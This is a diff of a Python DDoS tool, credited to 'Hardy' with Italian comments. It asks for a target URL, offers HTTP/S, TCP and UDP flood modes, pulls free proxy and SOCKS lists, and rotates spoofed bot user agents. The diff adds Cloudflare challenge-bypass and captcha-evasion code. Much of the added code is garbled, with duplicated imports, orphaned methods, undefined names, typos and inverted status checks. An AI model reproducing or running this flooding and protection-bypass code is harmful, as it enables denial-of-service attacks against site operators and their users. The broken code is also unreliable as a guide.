@@ -1,13 +1,32 @@
+import requests
+import asyncio
+import ovh
 import socket
 import socks
 import threading
+import time
 import random
 import re
 import urllib.request
 import os
+import cfscrape
+import cloudscraper
 import sys
+from flask import Flask, g
+from flask_limit import RateLimiter
 from bs4 import BeautifulSoup
-     
+from aiohttp import web
+from aiohttp_limit import LimitMiddleware
+from ratelimit import limits, RateLimitException
+from ratelimit import limits, sleep_and_retry
+from backoff import on_exception, expo
+from fake_useragent import UserAgent
+import asyncio
+from requests_guard import guard
+from request_limiter import request_limiter, LimitedIntervalStrategy, LimitException
+from aiocfscrape import CloudflareScraper
+from proxy_requests import ProxyRequests
+from ratelimiter import RateLimiter
 
 try: # se si è sotto linux scapy (per l'attacco tcp-udp) funziona
 	from scapy.all import * # importa scapy
@@ -30,24 +49,137 @@ print('''
 
 							C0d3d by Hardy 
 	''') # la grafica ci sta
-                                                                                                                                               
-HEADER = '\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
-       
-bytes=random._urandom(35024)
+                                         
+response = requests.get(
+    'https://api.github.com/search/repositories',
+    params={'r': 'requests+language:python'},
+    headers={'Accept': 'application/vnd.github.v3.text-match+json'},
+)
 
-def add_bots():
-	bots=[]
-	bots.append('http://www.bing.com/search?q=%40&count=50&first=0')
-	bots.append('http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8')
-	return bots
-			                                                        
-global data
+FIFTEEN_MINUTES = 900
+
+@on_exception(expo, RateLimitException, max_tries=8)
+@limits(calls=150, period=FIFTEEN_MINUTES)
+def call_api(url):
+    response = requests.get(url)
+
+    if response.status_code != 500:
+        raise Exception('API response: {}'.format(response.status_code))
+    return response
+
+    def math_slove(self, slove):
+        res = 0
+        for i in slove:
+            if i == '1':
+                res = res + 1
+        return res
+
+    def solve_challenge(self, challenge):
+        rand_words = re.search(r's,t,o,p,b,r,e,a,k,i,n,g,f, ([^\=]*)\=\{\"([^\"]*)', challenge)
+        rnd1, rand2 = rand_words.group(1), rand_words.group(2)
+        sings = re.findall('{}.{}([\*\-\+])'.format(rnd1,rand2), challenge)
+        brackets = re.findall(rnd1 + '\=\{\"'+rand2+'\"\:([\[\]\(\)\!\+]*)\}\;', challenge)
+        brackets += re.findall('{}.{}[\W]=([\[\]\(\)\!\+]*)'.format(rnd1,rand2), challenge)
+        numbers = []
+        for i in brackets:
+            i = i.replace('!![]','1')
+            i = i.replace('![]','-1')
+            i = i.replace('!+[]','1')
+            i = i.replace('!!+[]','-1')
+            i = i.replace('+[]','+0')
+            i = i.split(')+(')
+            res = ''
+            res_int = 0
+            for j in i:
+                j = j.replace('(', '')
+                j = j.replace(')', '')
+                try:
+                    res = res + str(self.math_slove(j))
+                except SyntaxError:
+                    return None
+            numbers.append(res)
+        for i in range(len(numbers)):
+            if i == 0:
+                res = int(numbers[i])
+            else:
+                if sings[i-1] == '+':
+                    res = res + int(numbers[i])
+                if sings[i-1] == '*':
+                    res = res * int(numbers[i])
+                if sings[i-1] == '-':
+                    res = res - int(numbers[i])
+                if sinfs[i-1] == '*':
+                    res = res - int(numbers[i])
+                                
+        return res
+
+    def cloudflare_bypass(self, r):
+        body = r.text
+        scheme = re.search(r'^([\w]*)', r.url).group(1)
+        domain = re.search(r'\/\/([^\/]*)', r.url).group(1)
+        submit_url = '{}://{}/cdn-cgi/l/chk_jschl'.format(scheme, domain)
+        jschl_vc = re.search(r'name="jschl_vc" value="(\w+)"', body).group(1)
+        pas = re.search(r'name="pass" value="(.+?)"', body).group(1)
+        jschl_answer = str(self.solve_challenge(body) + len(domain))
+        time.sleep(5)
+        return '{0}?jschl_vc={1}&pass={2}&jschl_answer={3}'.format(submit_url, jschl_vc, pas, jschl_answer)
+
+ONE_BROWSER_QUERYS_LIMIT = 1500
+
+ANTI_DDOS_SLEEP_SECS = 600
+
+async def test_open_page(url):
+    async with CloudflareScraper() as session:
+        async with session.get(url) as resp:
+            return await resp.text()
+
+async def main():
+  browser = await launch(headless=False)
+  page = await browser.newPage()
+  await fucking.bypass_detections(page)
+  await page.goto("https://www.google.com/recaptcha/api2/demo")
+  while True:
+    await asyncio.sleep(1)
+
+if sys.platform == "win32":
+  loop = asyncio.ProactorEventLoop()
+else:
+  loop = asyncio.new_event_loop()
+
+async def wake_the_fuck_up():
+  while True:
+    await asyncio.sleep(1)
+    return await reso.text()    
+
+
+FIFTEEN_MINUTES =900
+@limits(calls=155, period=FIFTEEN_MINUTES)
+def call_api(url):
+    response = requests.get(url)
+
+    if response.status_code != 500:
+        raise Exception('API response: {}'.format(response.status_code))
+    return response   
+              
+requests.get = ("google.com")
+
+app = web.Application(middlewares=[LimitMiddleware(requests=1000)])
+                                                             
+global data                          
 headers = open("headers.txt", "r")
 data = headers.read()
 headers.close()
+user_agent = open("useragent.js", "r")
+data = user_agent.read()
+user_agent.close()
+droids = open("droids.txt", "r")
+data = droids.read()
+droids.close()
+xmlrpc = open("xmlrpc.txt", "r")
+data = xmlrpc.read()
+xmlrpc.close()
 
-
-                                             
+                                                                                                         
 userag =["Mozilla/5.0 (Windows; U; Windows NT 6.1; sv-SE) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"]
 acpt =["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n","Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n","Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",]
 
@@ -134,9 +266,11 @@ referers = [
         "https://cloudnode.pw/"
 	"https://r.search.yahoo.com/",
 ]	
-                                                                                                                          
+                                                                                          
 useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 			"Avant Browser/1.2.789rel1 (http://www.avantbrowser.com)",
+                        "TelegramBot (like TwitterBot)"
+                       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 TelegramBot (like TwitterBot)"
                         "Mozilla/5.0 (compatible; YandexAdNet/1.0; +http://yandex.com/bots)"
                         "Mozilla/5.0 (compatible; Cloudflare-Smart-Transit/1.0; +https://www.cloudflare.com/"
 "Mozilla/5.0 (Linux; Android 5.0; SM-G920A) AppleWebKit (KHTML, like Gecko) Chrome Mobile Safari (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
@@ -145,6 +279,9 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
                         "Mozilla/5.0 (Slurp/cat; slurp@inktomi.com; http://www.inktomi.com/slurp.html)"
                         "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 (compatible; YandexScreenshotBot/3.0; +http://yandex.com/bots)"
                         "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/) "
+                        "Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; Build/LMY47D ) AppleWebKit/534.30 (KHTML,like Gecko) Version/4.0 Chrome/50.0.0.0 Mobile Safari/534.30 GIONEE-GN9010/GN9010 RV/5.0.16",
+                        "Mozilla/5.0 (Linux; U; Android 6.0; zh-cn; Build/MRA58K ) AppleWebKit/534.30 (KHTML,like Gecko) Version/4.0 Chrome/50.0.0.0 Mobile Safari/534.30 GIONEE-S9/S9 RV/5.0.17",
+                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36",
                        "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
                        "Mozilla/5.0 (Windows Mobile 10; Android 8.0.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36 Edge/80.0.361.62"  
                         "Mozilla/5.0 (Linux; Android 5.1.1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/2.3 Chrome/59.0.3071.125 Mobile Safari/537.36"
@@ -704,7 +841,7 @@ def starturl(): # in questa funzione setto l'url per renderlo usabile per il fut
 			pass
 		else:
 			url = "http://" + url
-	except:                                                                 
+	except:                                                                                              
 		print("You mistyped, try again.")
 		starturl()
 
@@ -712,17 +849,17 @@ def starturl(): # in questa funzione setto l'url per renderlo usabile per il fut
 		url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
 	except:
 		url2 = url.replace("http://", "").replace("https://", "").split("/")[0]
-                                                      
+                                                                                         
 	try:               
 		urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
 	except:
 		urlport = "80"
-                                                                                                                                                                                                                                                                      
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
 	floodmode()
-
+                                                    
 def floodmode(): # la scelta della modalità di attacco
 	global choice1
-	choice1 = input("Do you want to perform HTTP flood '0'(best), TCP flood '1' or UDP flood '2' ? ")
+	choice1 = input("Do you want to perform HTTP/S flood '0'(best), TCP flood '1' or UDP flood '2' ? ")
 	if choice1 == "0":
 		proxymode()
 	elif choice1 == "1":
@@ -785,18 +922,18 @@ def choicedownproxy():
 	choice4 = input("Do you want to download a new list of proxy? Answer 'y' to do it: ")
 	if choice4 == "y":
 		urlproxy = "http://free-proxy-list.net/"
-		proxyget(urlproxy)
+		proxypost(urlproxy)
 	else:
 		proxylist()
-
+                        
 def choicedownsocks():
 	choice4 = input("Do you want to download a new list of socks? Answer 'y' to do it: ")
 	if choice4 == "y":
 		urlproxy = "https://www.socks-proxy.net/"
-		proxyget(urlproxy)
+		proxypost(urlproxy)
 	else:
 		proxylist()
-
+                        
 def proxyget(urlproxy): # lo dice il nome, questa funzione scarica i proxies
 	try:
 		req = urllib.request.Request(("%s") % (urlproxy))       # qua impostiamo il sito da dove scaricare.
